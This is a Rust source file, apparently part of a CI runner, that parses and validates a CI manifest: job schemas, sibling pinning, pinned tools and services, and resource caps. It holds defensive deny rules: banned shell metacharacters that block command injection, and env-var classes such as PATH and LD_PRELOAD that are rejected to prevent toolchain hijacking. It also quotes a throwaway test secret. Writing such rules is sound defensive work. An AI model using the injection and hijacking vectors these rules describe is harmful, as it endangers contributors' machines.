//! `.qontinui/ci.toml` manifest — the ONLY source of executed commands
//! (plan §4.1: coord's dispatch carries no commands; the manifest is read
//! from the checked-out tree at the dispatched SHA and validated strictly).
//!
//! Beyond commands the manifest also DECLARES what the dispatch needs
//! provisioned — sibling repos ([`CiSibling`]), tools ([`CiTool`]) and
//! ephemeral services ([`CiService`]).
//! Declarative rather than executable on purpose: an in-manifest
//! `git clone …` or `cargo install …` step would pass the argv rules below
//! today (no banned metacharacter, and the executor does not sandbox the
//! filesystem), but it would be **unpinned** — no SHA coordination with the
//! dispatched commit — and **uncleaned**, because cleanup removes only the
//! dispatch-scoped directory. A declaration is pinnable and auditable; a
//! clone step is neither. The Actions lane reached the same conclusion
//! independently and now machine-enforces it
//! (`.github/workflows/forbid-sibling-clone.yml`).
//!
//! [`CiService`] extends that rule to containers, where it binds hardest: an
//! image reference is the container world's URL, and a manifest that could
//! supply one could make the runner pull an arbitrary payload from an
//! arbitrary registry and RUN it as a listening server on a user's machine.
//! So a service is NAMED from a closed registry ([`crate::services`]) and its
//! version PINNED, exactly like a tool.

use serde::Deserialize;
use std::collections::BTreeMap;

use crate::host_sizing::HostSizing;

/// Default per-step timeout (1h) when a step does not specify one.
pub const DEFAULT_STEP_TIMEOUT_SECS: u64 = 3_600;
/// Hard cap on any step's timeout (2h) — a larger value is a validation
/// error, not a clamp, so authors see the limit instead of silently losing
/// budget.
pub const MAX_STEP_TIMEOUT_SECS: u64 = 7_200;

/// Env vars a step may set. Deliberately a tight allowlist of build-tuning
/// knobs: nothing PATH/CARGO_HOME-class that could redirect binary or
/// toolchain resolution on the host.
///
/// THIS IS A SECURITY BOUNDARY. Every entry is justified individually below;
/// there is no batch approval. The test `env_outside_allowlist_rejected`
/// pins the classes that must never be added.
const ENV_ALLOWLIST: &[&str] = &[
    "RUSTFLAGS",
    "RUST_BACKTRACE",
    "RUST_LOG",
    "CARGO_INCREMENTAL",
    "CARGO_TERM_COLOR",
    "NODE_OPTIONS",
    "NODE_ENV",
    "CI",
    "QONTINUI_DISABLE_KEYCHAIN",
    // ── Added for Actions-lane parity. Each entry below is set by a LIVE
    // gate step in one of the two Actions workflows this lane must agree
    // with; nothing was added speculatively.
    //
    // `qontinui-runner/.github/workflows/ci.yml` sets this on its Rust test
    // step. It selects the runner's own no-database test mode. Product
    // feature flag, same class as QONTINUI_DISABLE_KEYCHAIN above: it cannot
    // influence which binary or toolchain resolves. Without it the runner's
    // own `.qontinui/ci.toml` cannot reach parity with its Actions gate.
    "QONTINUI_ALLOW_NO_DB",
    // `qontinui-coord/.github/workflows/ci.yml` sets `CARGO_PROFILE_TEST_DEBUG=0`
    // on its db-test job. It is a cargo PROFILE override — it lowers the
    // debuginfo emitted into test binaries — so it changes the footprint of
    // the artifacts, never the resolution of a program. That footprint is
    // exactly the thing a small host runs out of, so a manifest must be able
    // to trade backtrace quality for headroom the way the Actions lane does.
    "CARGO_PROFILE_TEST_DEBUG",
    //
    // ── NOTHING WAS ADDED FOR THE NODE/PYTHON REGISTRY ENTRIES ───────────
    //
    // Opening the tool registry to node/npm and to Python packages
    // (`ci_node::tools`) raised the obvious question of whether that ecosystem
    // needs its own keys here — `POETRY_*`, `npm_config_*`, `PIP_*`,
    // `PYTHONPATH`. The answer is NO, on two independent grounds, and it is
    // recorded rather than left as an absence.
    //
    // 1. THE EXISTING BAR IS NOT MET. Every entry above is set by a LIVE gate
    //    step in an Actions workflow this lane must agree with; nothing was
    //    added speculatively. Re-checked 2026-08-18 across
    //    qontinui/.github/workflows, qontinui-web/.github/workflows,
    //    qontinui-schemas/.github/workflows and qontinui-runner/.github/
    //    workflows: not one `POETRY_*`, `npm_config_*`, `NPM_*` or `PIP_*`
    //    variable is set by any step. The poetry jobs are plain
    //    `poetry install` / `poetry run …`; the node jobs are plain
    //    `pnpm …`. Adding a key "because the ecosystem has one" is exactly the
    //    batch approval this boundary forbids.
    //
    // 2. THE ONES THAT WOULD MATTER ARE THE FORBIDDEN CLASS ANYWAY.
    //    `npm_config_prefix`, `npm_config_cache`, `PIP_TARGET`,
    //    `PIP_INDEX_URL`, `POETRY_VIRTUALENVS_PATH` and `PYTHONPATH` all
    //    redirect where a tool RESOLVES or INSTALLS things — the same class as
    //    PATH, CARGO_HOME and LD_PRELOAD, which this list exists to keep out
    //    of a manifest's hands. The provisioned tool's own layout is owned by
    //    the executor, the way it already owns PATH and CARGO_TARGET_DIR: the
    //    registry installs into a version-keyed cache and puts exactly that
    //    directory on the front of PATH. A manifest that could re-point the
    //    prefix could un-provision the tool it just declared.
    //
    // A project's dependency install stays a STEP (`npm ci`, `poetry
    // install`), which needs no env at all — it is repo-scoped and
    // lockfile-pinned. `NODE_OPTIONS`/`NODE_ENV`/`CI` above already cover what
    // those steps legitimately tune. The test
    // `ecosystem_env_still_outside_the_allowlist` pins this decision.
    //
    // ── NOTHING WAS ADDED FOR SERVICE CONNECTIONS EITHER ─────────────────
    //
    // `[[services]]` gives a step a database and a cache, which it obviously
    // has to reach. That did NOT widen this list: every connection variable
    // (`DATABASE_URL`, the libpq `PG*` family, `REDIS_URL`/`REDIS_HOST`/
    // `REDIS_PORT`) is EXECUTOR-OWNED and rejected via
    // `services::kind_exporting` instead. The reason is not stylistic — a
    // manifest *could not* write those values if it wanted to: the port is
    // assigned at dispatch
    // time by the kernel (a user's machine may already run Postgres on 5432),
    // and the password is generated per dispatch precisely so that no
    // committed file ever contains one. A manifest key that can only ever hold
    // a wrong value is worse than no key.
    //
    // ── ADDED FOR THE DATABASE-BACKED SUITE THIS PHASE UNBLOCKS ──────────
    //
    // Each of the four below is set by a LIVE gate step — qontinui-web's
    // `backend-ci.yml` `test` job, "Run tests with coverage", the very job
    // `[[services]]` exists to make expressible — and each is app
    // configuration for the dispatched repo's own test process. None can
    // influence which binary or toolchain resolves on the host, which is the
    // class this boundary exists to keep out (PATH, CARGO_HOME, LD_PRELOAD,
    // npm_config_prefix, PYTHONPATH — all still rejected, pinned by
    // `ecosystem_env_still_outside_the_allowlist`).
    //
    // Selects the app's test configuration branch.
    "TESTING",
    // Names the app's config profile (`development`). A string the app reads,
    // not a path anything resolves through.
    "ENVIRONMENT",
    // The app's session-signing key. Test-only by construction: the Actions
    // step's value is the literal
    // `test-secret-key-for-testing-only-minimum-32-characters-long`, and a
    // manifest is a committed file — anything written here is public by
    // definition and must be a throwaway. Allowlisted because the suite
    // refuses to boot without one, NOT because a manifest is a place for
    // secrets.
    "SECRET_KEY",
    // Feature flag for the app's redis client. Paired with a `[[services]]`
    // redis entry, whose CONNECTION values stay executor-owned.
    "REDIS_ENABLED",
];

/// Env vars the EXECUTOR owns and exports itself. A step setting one of
/// these would be silently overridden (the executor's value wins — see
/// `executor::run_step`), so they are rejected at validation with a message
/// naming the manifest key that actually controls them. Rejecting is
/// strictly better than allowlisting-then-ignoring: a cap that looks set but
/// is not is how `--test-threads 4` ended up smuggled through argv.
const EXECUTOR_OWNED_ENV: &[(&str, &str)] = &[
    ("CARGO_BUILD_JOBS", "[limits].cargo_build_jobs"),
    ("RUST_TEST_THREADS", "[limits].test_threads"),
    ("NEXTEST_TEST_THREADS", "[limits].test_threads"),
    (
        "CARGO_TARGET_DIR",
        "the executor's per-repo CI target dir (not settable)",
    ),
    // NOTE: the SERVICE connection variables (`DATABASE_URL`, the libpq `PG*`
    // family, `REDIS_URL`/`REDIS_HOST`/`REDIS_PORT`) are executor-owned too,
    // but they are not restated here — they are derived from
    // `services::kind_exporting`, so a new export closes the manifest side
    // automatically instead of relying on someone remembering this list.
];

/// Shell metacharacters banned from command argv tokens. Commands are
/// executed as argv (never a shell string), but on Windows a `.cmd` shim
/// (pnpm) requires a `cmd.exe /C` respawn where these would become live —
/// banning them keeps that fallback injection-safe.
const ARGV_BANNED_CHARS: &[char] = &['&', '|', '<', '>', '^', '"', '\n', '\r', '\0', '%'];

/// Upper bound on declared siblings/tools per manifest. Not a security
/// property — a legibility one: a manifest needing more than this has a
/// layout problem the executor should not paper over.
const MAX_PROVISIONED_ENTRIES: usize = 8;

/// The manifest exactly as written, before validation. Private: every consumer
/// reads the validated, version-erased [`CiManifest`], never this.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawManifest {
    /// Manifest schema version — 1 or 2.
    version: u32,
    /// v1 only: the one job's steps.
    #[serde(default)]
    steps: Vec<CiStep>,
    /// v1 only: the one job's services. In v2 services are per job.
    #[serde(default)]
    services: Vec<CiService>,
    /// v2 only.
    #[serde(default)]
    jobs: Vec<RawJob>,
    #[serde(default)]
    limits: CiLimits,
    #[serde(default)]
    siblings: Vec<CiSibling>,
    #[serde(default)]
    tools: Vec<CiTool>,
    #[serde(default)]
    canonical: Option<CiCanonical>,
}

/// One `[[jobs]]` entry as written.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawJob {
    name: String,
    #[serde(default)]
    os: OsSpec,
    #[serde(default)]
    needs: Vec<String>,
    #[serde(default)]
    schedule: Option<String>,
    #[serde(default)]
    services: Vec<CiService>,
    #[serde(default)]
    limits: Option<CiLimits>,
    steps: Vec<CiStep>,
}

/// An operating system a job runs on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Os {
    /// Any host. The default, and exclusive: it cannot be listed beside a
    /// named OS.
    Any,
    Linux,
    Windows,
    Macos,
}

impl Os {
    pub fn as_str(self) -> &'static str {
        match self {
            Os::Any => "any",
            Os::Linux => "linux",
            Os::Windows => "windows",
            Os::Macos => "macos",
        }
    }

    /// The OS this process runs on, or `None` on one no job can name.
    pub fn current() -> Option<Os> {
        match std::env::consts::OS {
            "linux" => Some(Os::Linux),
            "windows" => Some(Os::Windows),
            "macos" => Some(Os::Macos),
            _ => None,
        }
    }
}

/// `os = "linux"` or `os = ["linux", "windows"]` (a matrix: one run per OS).
#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
enum OsSpec {
    One(Os),
    Matrix(Vec<Os>),
}

impl Default for OsSpec {
    fn default() -> Self {
        OsSpec::One(Os::Any)
    }
}

/// The validated, version-erased manifest every consumer reads.
///
/// A v1 manifest (one flat `[[steps]]` list) reads as exactly one job named
/// [`crate::dispatch::DEFAULT_JOB`] that carries the top-level steps and
/// services. A v2 manifest declares `[[jobs]]`. Either way consumers see only
/// [`CiManifest::jobs`].
///
/// `[[siblings]]`, `[[tools]]`, `[limits]` and `[canonical]` stay TOP-LEVEL in
/// both versions. Siblings above all: coord's allocate lane
/// (`qontinui-coord` `ci_siblings.rs`) reads top-level `[[siblings]]` with a
/// reader that is lenient about every other key, so moving them under a job
/// would make it fail open to "no siblings" with no error — and every
/// allocated worktree would lose its sibling checkouts. Siblings and tools are
/// a property of the checkout and the dispatch workspace, not of a job.
///
/// # Land order: executor first, manifests after
///
/// `deny_unknown_fields` and the version check mean a `version = 2` manifest is
/// a hard refusal on any executor built before v2 — a dispatch failure on a
/// user's machine. Roll the executor out first and land v2 manifests after,
/// exactly as `[canonical]`, `[[tools]]` and `[[siblings]]` each landed.
///
/// And a second precondition for a v2 manifest with no job named `ci`: coord
/// must send `job` on its dispatches. A dispatch that names no job runs the
/// default `ci` job; when a v2 manifest declares none, the executor reports
/// `cancelled` (`job_not_declared`) rather than red, so such a manifest is
/// safe to land early — but none of its jobs RUN on the coord lane until coord
/// names them.
#[derive(Debug, Clone)]
pub struct CiManifest {
    /// `1` or `2`, kept for logs and reporting only.
    pub schema_version: u32,
    /// Topologically ordered by `needs` (declaration order among peers); never
    /// empty.
    pub jobs: Vec<CiJob>,
    /// Caps every job inherits unless it declares its own `limits`.
    pub limits: CiLimits,
    /// Sibling repos to materialise alongside the dispatched worktree so
    /// relative path-deps (`../qontinui-schemas/rust`) resolve.
    pub siblings: Vec<CiSibling>,
    /// Tools the executor must supply on the step PATH.
    pub tools: Vec<CiTool>,
    /// The canonical-configuration requirement, if this repo has one. Absent
    /// (the default) means the dispatch makes no claim about the box's
    /// toolchains and none is checked.
    pub canonical: Option<CiCanonical>,
}

/// One job: a named, ordered list of steps that runs as one dispatch in its
/// own fresh checkout.
///
/// Jobs share NO workspace. `needs` orders and gates them (a red upstream job
/// skips the downstream one); it never passes files between them.
#[derive(Debug, Clone)]
pub struct CiJob {
    /// `^[a-z0-9][a-z0-9-]{0,47}$`, unique. The job's identity everywhere:
    /// `qontinui-ci run --job <name>`, the check run `qontinui-ci / <name>`.
    pub name: String,
    /// `[Os::Any]`, or the explicit set (more than one is a matrix).
    pub os: Vec<Os>,
    /// Jobs that must succeed before this one runs.
    pub needs: Vec<String>,
    /// A 5-field UTC cron expression. A job with a schedule runs ONLY on it:
    /// never for a pull request or a merge candidate, never a merge gate.
    pub schedule: Option<String>,
    /// Ephemeral services (a database, a cache) this job's steps need.
    /// Started before the first step, health-gated, destroyed with the run.
    pub services: Vec<CiService>,
    /// This job's own caps; `None` inherits [`CiManifest::limits`].
    pub limits: Option<CiLimits>,
    pub steps: Vec<CiStep>,
}

impl CiManifest {
    /// The job named `name`.
    pub fn job(&self, name: &str) -> Option<&CiJob> {
        self.jobs.iter().find(|j| j.name == name)
    }

    /// The jobs a pull-request or merge-candidate run executes — every job
    /// without a schedule.
    pub fn gate_jobs(&self) -> impl Iterator<Item = &CiJob> {
        self.jobs.iter().filter(|j| j.schedule.is_none())
    }

    /// The caps `job` runs under: its own `limits`, else the manifest's.
    pub fn limits_for<'a>(&'a self, job: &'a CiJob) -> &'a CiLimits {
        job.limits.as_ref().unwrap_or(&self.limits)
    }
}

/// The check-run context prefix every job reports under.
pub const CHECK_CONTEXT_PREFIX: &str = "qontinui-ci";

impl CiJob {
    /// Whether this job runs on a host of OS `os` — `None` being a host OS no
    /// job can name, which only an `any` job runs on.
    pub fn runs_on(&self, os: Option<Os>) -> bool {
        self.os.iter().any(|o| *o == Os::Any || Some(*o) == os)
    }

    /// The check-run contexts this job produces: `qontinui-ci / <name>`, or one
    /// `qontinui-ci / <name> (<os>)` per OS of a matrix.
    pub fn check_contexts(&self) -> Vec<String> {
        if self.os.len() > 1 {
            self.os
                .iter()
                .map(|o| format!("{CHECK_CONTEXT_PREFIX} / {} ({})", self.name, o.as_str()))
                .collect()
        } else {
            vec![format!("{CHECK_CONTEXT_PREFIX} / {}", self.name)]
        }
    }
}

/// "This build requires the box to be at the canonical configuration for these
/// toolchains."
///
/// # What this declares, and what it deliberately does NOT
///
/// It declares a **requirement**. It does not, and must not, grant permission
/// to satisfy that requirement by rewriting the owner's global toolchain — a
/// manifest is a file in someone else's repository, and converging a machine's
/// rustup/volta/pyenv installation is a far larger act than dropping a pinned
/// binary into a dispatch-scoped cache. The authority to converge lives on the
/// box, in `CiNodeSettings::canonical_converge`, default false.
///
/// With no authority and a drifted box the dispatch is **refused**, not run
/// anyway — see `ci_node::canonical` for why that arm was chosen over the
/// defensible alternative.
///
/// # Why toolchain NAMES and not a bare `required = true`
///
/// The `versions` section carries far more than toolchains: repo-derived keys
/// (`node_dep_*`, `python_dep_*`) that converge by pulling the repo rather than
/// by anything this runner could apply, an installed-package inventory digest,
/// a sibling-schemas stamp. Gating on the whole section being clean would make
/// the declaration unsatisfiable for reasons that have nothing to do with the
/// toolchain a build compiles with. Naming the toolchains keeps the requirement
/// exactly as wide as the build's real dependency — and keeps the blast radius
/// of a convergence exactly as wide as the declaration, since only the named
/// keys are ever passed to the apply.
///
/// # Land order: runner first, manifests after
///
/// `deny_unknown_fields` on the manifest means a manifest carrying a
/// `[canonical]` table is a **hard parse error** on any runner built before
/// this phase — the dispatch fails validation, on a required check, on a
/// user's machine, for a change that looks purely local. That is the same
/// coupling `[[tools]]` and `[[siblings]]` each had before theirs, and the fix
/// is the same one: roll the runner out first and land the manifests that
/// declare it after. It is deliberately NOT a compatibility shim — version
/// skew here is a sequencing problem, and a shim would only hide it.
///
/// The set is CLOSED: [`CANONICAL_TOOLCHAINS`], the keys a host's
/// convergence machinery has a version-manager cascade for, so a manifest can
/// never name a key no machine could converge.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CiCanonical {
    /// Toolchain keys — any of `node`, `python`, `rustc`.
    pub toolchains: Vec<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CiStep {
    pub name: String,
    /// Argv vector — `["cargo", "test"]`, NEVER a shell string.
    pub command: Vec<String>,
    /// Extra env for this step. Keys must be in the allowlist.
    #[serde(default)]
    pub env: BTreeMap<String, String>,
    /// Per-step timeout; default [`DEFAULT_STEP_TIMEOUT_SECS`], max
    /// [`MAX_STEP_TIMEOUT_SECS`].
    pub timeout_secs: Option<u64>,
    /// Repo-relative working dir (e.g. `src-tauri`). Must not escape the
    /// worktree — validated structurally here AND canonicalize+prefix-checked
    /// at execution time.
    pub working_dir: Option<String>,
}

/// How a sibling's commit is chosen.
///
/// Every variant is the GitHub Actions lane's rule, not a third one. That
/// rule lives in `.github/actions/checkout-sibling/action.yml` (Phase A
/// landed as `a543cc7e1`/#984; Phase B is PR #1008; the recorded pin is
/// #1158) and the two lanes must agree on which sibling tree a given change
/// compiles against — otherwise "parity" means nothing.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SiblingPin {
    /// The Actions rule for a sibling `.github/sibling-pins.conf` does not
    /// list: the sibling tree is the **declared adaptation PR** — the coord dep edge (`coord:downstream-of=` on the
    /// dispatched PR, or `coord:upstream-of=` on a sibling PR) that the pair
    /// already has to declare for merge ordering — pinned to that PR's head
    /// SHA. A branch NAME is not an identity: it cannot be checked for having
    /// a pull request, a reviewer, a current base, or any base at all, and
    /// the identical name-matching mechanism was exploited in production on
    /// 2026-07-28 (a consumer gate went green against a branch with no PR).
    ///
    /// With no declaration — and, per the Actions action's property 3, with
    /// no pull request at all — this resolves to [`CiSibling::branch`],
    /// which is the action's answer only for a sibling the pin file does not
    /// list; for a listed one [`SiblingPin::PinFile`] is the action's rule.
    /// The
    /// CI-node lane dispatches `refs/heads/merge-candidate/<proposal_id>`
    /// pushes, which is exactly the event class the Actions action resolves
    /// to the default branch WITHOUT an API call, and for the same reason:
    /// coord pushes the SAME candidate ref into every repo of a multi-repo
    /// proposal, so keying off the ref name would compile against a tree that
    /// is force-pushed and deleted as the proposal resolves.
    #[default]
    DeclaredAdaptation,
    /// Always the tip of [`CiSibling::branch`]; declarations are never read.
    /// For siblings that are not part of an adaptation pair — a repo consumed
    /// as a published artifact (e.g. an OpenAPI spec source) rather than
    /// co-evolved with the dispatched repo, and for which no adaptation-PR
    /// protocol exists.
    DefaultBranch,
    /// The Actions rule in full, INCLUDING its lowest-priority answer: when
    /// no declaration resolves, the commit recorded for this sibling in
    /// `.github/sibling-pins.conf` ([`crate::sibling::SIBLING_PIN_FILE`]) —
    /// the manifest `checkout-sibling` reads through its `pin-file` input and
    /// the `sibling pin bump` workflow keeps current — rather than the tip of
    /// [`CiSibling::branch`]. A declared adaptation still outranks the pin,
    /// exactly as in the action, so cross-repo pairs still land.
    ///
    /// This is what stops the CI-node lane floating where the Actions lane
    /// does not. A floating checkout let a sibling land red this repo's
    /// `main` and hold the merge train for 5h+ on 2026-08-20 with no runner
    /// commit involved; #1158 pinned the Actions lane, and until this variant
    /// existed `.qontinui/ci.toml` could only DECLARE the divergence.
    ///
    /// Stricter than the action in two places, on purpose: the action floats a
    /// sibling that is simply not listed (its pin is opt-in per entry, and the
    /// file is the only place that opt-in can live), whereas this variant IS
    /// the opt-in, so a manifest that lacks the entry — or no manifest at all
    /// — is a hard error rather than a silent float. Float on purpose by
    /// writing [`SiblingPin::DefaultBranch`], where a reader can see it.
    PinFile,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CiSibling {
    /// `owner/name`. The owner is REQUIRED here (unlike coord's dep-edge
    /// grammar) because this value is turned into a clone URL, and inferring
    /// an owner for a network fetch is exactly the kind of guess that ends up
    /// pointing at somebody else's repository.
    pub repo: String,
    #[serde(default)]
    pub pin: SiblingPin,
    /// Branch used when no adaptation is declared, and the only source under
    /// [`SiblingPin::DefaultBranch`].
    #[serde(default = "default_sibling_branch")]
    pub branch: String,
    /// Follow a declaration that orders the sibling AFTER this side.
    ///
    /// OFF by default, and the default is the safety property. A dep-edge
    /// label names the pair; its direction names the merge order. When the
    /// sibling LEADS, its tree is what this repo's `main` will contain by the
    /// time this change lands, so compiling against it predicts main. When the
    /// sibling TRAILS, it does not: following the declaration would compile
    /// against a tree that is not main yet and will not be until AFTER this
    /// change lands. A step that mis-declared the direction would then go
    /// green here and red `main` on landing — the exact vacuous green the
    /// declared-adaptation rule exists to prevent, arriving from the other
    /// side.
    ///
    /// Turn it on ONLY for a step whose question is genuinely about the PAIR
    /// rather than about what main will look like: a codegen-drift check,
    /// which asks "do the sibling's checked-in artifacts match what this tree
    /// generates" and must therefore read the paired tree in EITHER order. A
    /// compile step must leave this off.
    #[serde(default)]
    pub accept_trailing_sibling: bool,
}

fn default_sibling_branch() -> String {
    "main".to_string()
}

/// A tool the runner must place on the step PATH.
///
/// NOTE what is deliberately absent: a URL. The manifest names a tool from a
/// closed registry ([`crate::tools`]) and pins its version; it cannot point
/// the runner at an arbitrary download. That is a strictly stricter contract
/// than the argv rules — a repo can already run whatever it likes as a step,
/// but it must not be able to make the RUNNER fetch and cache an arbitrary
/// binary under a name that later steps resolve implicitly.
///
/// # Why this is still a flat `{name, version}` pair
///
/// Opening the registry to node raised the question of whether this needs a
/// shape for "a runtime PLUS its package manager" — `node 22` *with* `npm`.
/// It does not, and the decision is deliberate rather than inherited:
/// **npm's version is a property of the node release, not an independently
/// pinnable thing**, so a second version field would be a knob with nothing on
/// the other end (`actions/setup-node` behaves the same way). The
/// runtime-plus-ecosystem shape therefore lives in the REGISTRY — see
/// `ci_node::tools::Installer::PrebuiltTree`'s `companions`, which are checked
/// to exist and to run at provisioning time and whose versions are logged.
///
/// Keeping this pair flat also keeps `deny_unknown_fields` meaningful: every
/// key a manifest may write here is one of exactly two, and any third is a
/// hard parse error rather than a silently ignored hint.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CiTool {
    pub name: String,
    /// Exact version, e.g. `0.9.98`. `latest` is not accepted: an unpinned
    /// tool makes two dispatches of the same commit incomparable, and the
    /// version is also the cache key.
    pub version: String,
}

/// An ephemeral service the dispatch needs — a database, a cache — started in
/// a container before the first step and destroyed with the dispatch.
///
/// NOTE what is deliberately absent, and it is the same absence [`CiTool`]
/// has: an IMAGE. The manifest names a curated entry from the closed registry
/// in [`crate::services`] and pins its version; it cannot point the runner at
/// an arbitrary image, an arbitrary registry, a port, a volume, a command or a
/// set of container flags. A repo can already run whatever it likes as a step;
/// what it must not be able to do is make the RUNNER pull an arbitrary payload
/// and run it as a listening server on a contributor's machine.
///
/// Credentials are absent for a second reason: the runner GENERATES them per
/// dispatch. A manifest is a committed file, so a password field here would be
/// a password on GitHub, and a fixed one would be a password on every
/// contributor's loopback interface.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CiService {
    /// Registry entry name, e.g. `postgres-pgvector`.
    pub name: String,
    /// Image tag, e.g. `pg16`. Must name a version: a floating tag
    /// (`latest`, `stable`, a bare `alpine`) makes two dispatches of one
    /// commit incomparable, exactly as it does for a tool.
    pub version: String,
    /// Optional `sha256:…` image digest. A tag is a MUTABLE pointer — the
    /// same tag can be re-pushed at any time — so this is the only true pin,
    /// and it wins over `version` when both are present.
    #[serde(default)]
    pub digest: Option<String>,
}

/// Caps the executor exports to every step.
///
/// A value here is a **CEILING, not an override**: the effective cap is
/// `min(manifest value, host-derived value)`. Both parties know something the
/// other does not — the manifest author has measured this workload's cost per
/// token, the runner has measured this host — and taking the minimum honours
/// both while being able to exceed neither. Omitting a key means "size me from
/// the host", which is what a manifest should do unless it has a measurement.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CiLimits {
    /// Ceiling on `CARGO_BUILD_JOBS`.
    pub cargo_build_jobs: Option<u32>,
    /// Ceiling on the test-process/thread count. Exported as BOTH
    /// `RUST_TEST_THREADS` (libtest) and `NEXTEST_TEST_THREADS` (nextest) so
    /// the cap holds whichever harness a step uses — the Actions lane caps
    /// both for the same reason.
    pub test_threads: Option<u32>,
}

impl CiStep {
    pub fn effective_timeout_secs(&self) -> u64 {
        self.timeout_secs.unwrap_or(DEFAULT_STEP_TIMEOUT_SECS)
    }
}

impl CiSibling {
    /// Directory name the sibling is materialised under. The basename of the
    /// slug, which is what a relative path-dep spells.
    pub fn dir_name(&self) -> &str {
        crate::local_repo_name(&self.repo)
    }
}

impl CiLimits {
    pub fn effective_cargo_build_jobs(&self, host: HostSizing) -> u32 {
        cap_against_host(self.cargo_build_jobs, host.cargo_build_jobs)
    }

    pub fn effective_test_threads(&self, host: HostSizing) -> u32 {
        cap_against_host(self.test_threads, host.test_threads)
    }
}

/// `min(declared, host)`, with a floor of 1 so a `0` in a manifest cannot
/// export a cap cargo would reject.
fn cap_against_host(declared: Option<u32>, host: u32) -> u32 {
    let host = host.max(1);
    match declared {
        Some(d) => d.max(1).min(host),
        None => host,
    }
}

/// Upper bound on jobs per manifest. A legibility bound, like
/// [`MAX_PROVISIONED_ENTRIES`]: a manifest with more has a layout problem.
const MAX_JOBS: usize = 32;

/// Parse + validate a manifest body. All failures are `Err(String)` with an
/// author-actionable message (they end up in the dispatch's log tail).
pub fn parse_and_validate(text: &str) -> Result<CiManifest, String> {
    let raw: RawManifest = toml::from_str(text).map_err(|e| format!("ci.toml parse error: {e}"))?;
    validate_siblings(&raw.siblings)?;
    validate_tools(&raw.tools)?;
    validate_canonical(raw.canonical.as_ref())?;
    let jobs = match raw.version {
        1 => {
            if !raw.jobs.is_empty() {
                return Err(
                    "ci.toml declares [[jobs]] under version = 1 — jobs need version = 2"
                        .to_string(),
                );
            }
            if raw.steps.is_empty() {
                return Err("ci.toml has no [[steps]] — nothing to run".to_string());
            }
            validate_services(&raw.services)?;
            validate_steps(&raw.steps, "")?;
            vec![CiJob {
                name: crate::dispatch::DEFAULT_JOB.to_string(),
                os: vec![Os::Any],
                needs: Vec::new(),
                schedule: None,
                services: raw.services,
                limits: None,
                steps: raw.steps,
            }]
        }
        2 => {
            if !raw.steps.is_empty() {
                return Err(
                    "ci.toml version 2 has top-level [[steps]] — in version 2 every step \
                     belongs to a job: move them under a [[jobs]] entry as [[jobs.steps]]"
                        .to_string(),
                );
            }
            if !raw.services.is_empty() {
                return Err(
                    "ci.toml version 2 has top-level [[services]] — in version 2 services are \
                     per job: declare them on the job that needs them as [[jobs.services]]"
                        .to_string(),
                );
            }
            if raw.jobs.is_empty() {
                return Err("ci.toml version 2 has no [[jobs]] — nothing to run".to_string());
            }
            validate_jobs(raw.jobs)?
        }
        v => {
            return Err(format!(
            "ci.toml version {v} unsupported (this executor supports version = 1 and version = 2)"
        ))
        }
    };
    Ok(CiManifest {
        schema_version: raw.version,
        jobs,
        limits: raw.limits,
        siblings: raw.siblings,
        tools: raw.tools,
        canonical: raw.canonical,
    })
}

/// Validate v2 jobs and return them topologically ordered.
fn validate_jobs(raw: Vec<RawJob>) -> Result<Vec<CiJob>, String> {
    if raw.len() > MAX_JOBS {
        return Err(format!(
            "ci.toml declares {} [[jobs]] (max {MAX_JOBS})",
            raw.len()
        ));
    }
    let mut jobs: Vec<CiJob> = Vec::with_capacity(raw.len());
    for (i, job) in raw.into_iter().enumerate() {
        let label = if job.name.is_empty() {
            format!("jobs[{i}]")
        } else {
            format!("job '{}'", job.name)
        };
        validate_job_name(&job.name).map_err(|e| format!("{label}: {e}"))?;
        if jobs.iter().any(|j| j.name == job.name) {
            return Err(format!(
                "{label}: declared twice — job names must be unique"
            ));
        }
        let os = match job.os {
            OsSpec::One(o) => vec![o],
            OsSpec::Matrix(list) => {
                if list.is_empty() {
                    return Err(format!(
                        "{label}: os = [] names no OS — omit `os` to run anywhere"
                    ));
                }
                let mut seen: Vec<Os> = Vec::new();
                for o in list {
                    if seen.contains(&o) {
                        return Err(format!("{label}: os '{}' listed twice", o.as_str()));
                    }
                    seen.push(o);
                }
                if seen.len() > 1 && seen.contains(&Os::Any) {
                    return Err(format!(
                        "{label}: os \"any\" cannot be listed beside a named OS — \"any\" already \
                         covers every host"
                    ));
                }
                seen
            }
        };
        if let Some(cron) = &job.schedule {
            validate_cron(cron).map_err(|e| format!("{label}: schedule {cron:?}: {e}"))?;
        }
        if job.steps.is_empty() {
            return Err(format!("{label}: has no [[jobs.steps]] — nothing to run"));
        }
        validate_services(&job.services).map_err(|e| format!("{label}: {e}"))?;
        validate_steps(&job.steps, &format!("{label} "))?;
        jobs.push(CiJob {
            name: job.name,
            os,
            needs: job.needs,
            schedule: job.schedule,
            services: job.services,
            limits: job.limits,
            steps: job.steps,
        });
    }
    for job in &jobs {
        let mut seen: Vec<&str> = Vec::new();
        for need in &job.needs {
            if need == &job.name {
                return Err(format!("job '{}': needs itself", job.name));
            }
            if seen.contains(&need.as_str()) {
                return Err(format!("job '{}': needs '{need}' twice", job.name));
            }
            seen.push(need);
            let Some(upstream) = jobs.iter().find(|j| &j.name == need) else {
                return Err(format!(
                    "job '{}': needs '{need}', which is not a job in this manifest",
                    job.name
                ));
            };
            if upstream.schedule.is_some() && job.schedule.is_none() {
                return Err(format!(
                    "job '{}': needs '{need}', which runs only on its schedule — a job that \
                     gates pull requests cannot wait on one that never runs for them",
                    job.name
                ));
            }
        }
    }
    topological_order(jobs)
}

/// Kahn's algorithm, picking the earliest-declared ready job each round, so a
/// manifest with no `needs` keeps its declaration order. A cycle is an error
/// naming the jobs on it.
